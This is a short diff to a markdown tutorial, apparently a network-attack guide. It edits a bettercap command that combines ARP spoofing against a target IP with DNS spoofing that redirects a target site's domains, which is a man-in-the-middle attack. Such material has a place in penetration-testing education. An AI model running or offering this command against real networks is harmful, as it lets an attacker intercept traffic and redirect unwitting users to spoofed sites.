@@ -586,7 +586,7 @@ The same can be performed using our automated script as well which is at the spe
 - Now, let's start `bettercap` using the command:
 
   ```bash
-  bettercap -iface <interface_name>; net.probe on; net.recon on; net.sniff on; arp.spoof on; arp.spoof.fullduplex true; arp.spoof.targets <target_ip>; dns.spoof on; dns.spoof.all true; set dns.spoof.domains www.targetsite.com,*.targetsite.com
+  bettercap -iface <interface_name>; net.probe on; arp.spoof on; arp.spoof.fullduplex true; arp.spoof.targets <target_ip>; set dns.spoof.all true; set dns.spoof.domains www.targetsite.com,*.targetsite.com; dns.spoof on; 
   ```
   
 > [!NOTE]
